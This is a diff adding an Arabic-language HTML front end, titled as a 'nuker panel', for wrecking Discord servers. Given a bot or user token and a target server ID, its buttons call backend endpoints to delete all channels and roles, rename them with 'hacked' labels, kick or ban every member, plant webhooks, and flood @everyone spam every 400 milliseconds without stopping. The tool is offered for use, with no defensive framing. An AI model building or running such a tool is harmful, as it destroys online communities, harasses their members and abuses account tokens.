@@ -1,0 +1,154 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>GRoUpKh6r // NUKER PANEL</title>
+    <style>
+        * { box-sizing: border-box; margin: 0; padding: 0; }
+        body { background: #030303; color: #00ff66; font-family: Tahoma, sans-serif; padding: 15px; }
+        .wrapper { max-width: 650px; margin: auto; background: #0b0b0b; border: 2px solid #00ff66; padding: 20px; box-shadow: 0 0 30px rgba(0, 255, 102, 0.2); }
+        .title { text-align: center; color: #ff0055; font-size: 20px; font-weight: bold; margin-bottom: 20px; border-bottom: 1px dashed #ff0055; padding-bottom: 10px; }
+        .section { background: #111; border: 1px solid #333; padding: 12px; margin-bottom: 15px; }
+        .section h3 { color: #00e1ff; font-size: 14px; margin-bottom: 8px; }
+        label { display: block; margin: 6px 0 3px; color: #ccc; font-size: 12px; }
+        input, select { width: 100%; padding: 10px; background: #000; border: 1px solid #00ff66; color: #00ff66; font-family: monospace; margin-bottom: 8px; }
+        .btn-row { display: grid; grid-template-columns: 1fr 1fr; gap: 8px; }
+        button { width: 100%; padding: 11px; background: #00ff66; color: #000; border: none; font-weight: bold; cursor: pointer; margin-top: 5px; }
+        button:hover { background: #00e1ff; }
+        .btn-red { background: #ff0055; color: #fff; }
+        .btn-red:hover { background: #ff3377; }
+        .console { background: #000; border: 1px solid #444; color: #00ff66; padding: 10px; height: 90px; overflow-y: scroll; font-size: 11px; font-family: monospace; margin-top: 15px; }
+    </style>
+</head>
+<body>
+
+    <!-- أغنية أجنبية حماسية تتكرر تلقائياً -->
+    <audio id="bgMusic" src="https://cdnsound.org/track/phonk-aggressive-action.mp3" loop autoplay></audio>
+
+    <div class="wrapper">
+        <div class="title">GRoUpKh6r // OPERATION CONTROL</div>
+
+        <div class="section">
+            <label>نوع التوكن:</label>
+            <select id="isBot">
+                <option value="true">Bot Token</option>
+                <option value="false">User Account Token</option>
+            </select>
+            <label>التوكن:</label>
+            <input type="password" id="token" placeholder="أدخل التوكن هنا">
+            <label>آي دي السيرفر (Server ID):</label>
+            <input type="text" id="guildId" placeholder="أدخل آي دي السيرفر المستهدف">
+        </div>
+
+        <div class="section">
+            <h3>تحكم الرومات (Channels)</h3>
+            <label>اسم الرومات (بدون أرقام عشوائية):</label>
+            <input type="text" id="channelName" value="groupkh6r-hacked">
+            <label>عدد الرومات:</label>
+            <input type="number" id="channelCount" value="35">
+            <div class="btn-row">
+                <button onclick="runReq('/api/channels/create', {name: getVal('channelName'), count: getVal('channelCount')})">إنشاء رومات</button>
+                <button class="btn-red" onclick="runReq('/api/channels/delete')">حذف كل الرومات</button>
+            </div>
+            <label>تغيير أسماء الرومات الحالية:</label>
+            <input type="text" id="newChannelName" value="vandalized">
+            <button class="btn-red" onclick="runReq('/api/channels/rename', {newName: getVal('newChannelName')})">تغيير أسماء الكل</button>
+        </div>
+
+        <div class="section">
+            <h3>تحكم الرولات (Roles)</h3>
+            <label>اسم الرولات:</label>
+            <input type="text" id="roleName" value="GRoUpKh6r-Role">
+            <label>العدد:</label>
+            <input type="number" id="roleCount" value="20">
+            <div class="btn-row">
+                <button onclick="runReq('/api/roles/create', {roleName: getVal('roleName'), count: getVal('roleCount')})">إنشاء رولات</button>
+                <button class="btn-red" onclick="runReq('/api/roles/delete')">حذف كل الرولات</button>
+            </div>
+            <label>تغيير أسماء الرولات:</label>
+            <input type="text" id="newRoleName" value="HACKED BY G6R">
+            <button class="btn-red" onclick="runReq('/api/roles/rename', {newRoleName: getVal('newRoleName')})">تغيير أسماء الرولات</button>
+        </div>
+
+        <div class="section">
+            <h3>تحكم الأعضاء (Members)</h3>
+            <label>ألقاب الأعضاء (Nicknames):</label>
+            <input type="text" id="newNickname" value="GRoUpKh6r">
+            <button class="btn-red" onclick="runReq('/api/members/nicknames', {newNickname: getVal('newNickname')})">تغيير ألقاب الكل</button>
+            <div class="btn-row">
+                <button class="btn-red" onclick="runReq('/api/members/kick')">طرد جميع الأعضاء (Kick)</button>
+                <button class="btn-red" onclick="runReq('/api/members/ban')">حظر جميع الأعضاء (Ban)</button>
+            </div>
+        </div>
+
+        <div class="section">
+            <h3>السبام الخارق عبر الويب هوكس (مستمر تلقائياً)</h3>
+            <label>اسم الويب هوك:</label>
+            <input type="text" id="webhookName" value="GRoUpKh6r-Bot">
+            <button onclick="runReq('/api/webhooks/create', {webhookName: getVal('webhookName')})">زرع Webhooks بالرومات</button>
+            
+            <label>رسالة السبام:</label>
+            <input type="text" id="spamMessage" value="@everyone | SERVER NUKED BY GRoUpKh6r - MAXIMUM SPEED">
+            <button class="btn-red" onclick="toggleAutoSpam()">تشغيل سبام الويب هوكس المستمر (لا يتوقف)</button>
+        </div>
+
+        <div class="console" id="consoleBox">[System] Ready. Click anywhere to activate audio.</div>
+    </div>
+
+    <script>
+        // تشغيل الموسيقى تلقائياً عند أول تفاعل
+        document.body.addEventListener('click', () => {
+            const audio = document.getElementById('bgMusic');
+            if(audio.paused) audio.play();
+        }, { once: true });
+
+        function getVal(id) { return document.getElementById(id).value; }
+
+        function logMsg(txt) {
+            const box = document.getElementById('consoleBox');
+            box.innerHTML += `<br>> ${txt}`;
+            box.scrollTop = box.scrollHeight;
+        }
+
+        async function runReq(endpoint, dataExtra = {}) {
+            const token = getVal('token');
+            const guildId = getVal('guildId');
+            const isBot = document.getElementById('isBot').value === 'true';
+
+            if (!token || !guildId) {
+                alert('الرجاء إدخال التوكن وآي دي السيرفر أولاً!');
+                return;
+            }
+
+            logMsg(`[Executing] ${endpoint}`);
+            try {
+                const res = await fetch(endpoint, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ token, guildId, isBot, ...dataExtra })
+                });
+                const data = await res.json();
+                logMsg(data.message || 'تم التنفيذ بنجاح.');
+            } catch (err) {
+                logMsg(`[Error] ${err.message}`);
+            }
+        }
+
+        // سبام مستمر لا يتوقف تلقائياً
+        let spamTimer = null;
+        function toggleAutoSpam() {
+            if (spamTimer) {
+                clearInterval(spamTimer);
+                spamTimer = null;
+                logMsg('[!] تم إيقاف السبام المستمر.');
+            } else {
+                logMsg('[*] جاري إطلاق موجات السبام المستمرة عبر الويب هوكس...');
+                spamTimer = setInterval(() => {
+                    runReq('/api/webhooks/spam', { message: getVal('spamMessage') });
+                }, 400); // إرسال موجة جديدة كل 400 جزء من الثانية بلا توقف
+            }
+        }
+    </script>
+</body>
+</html>
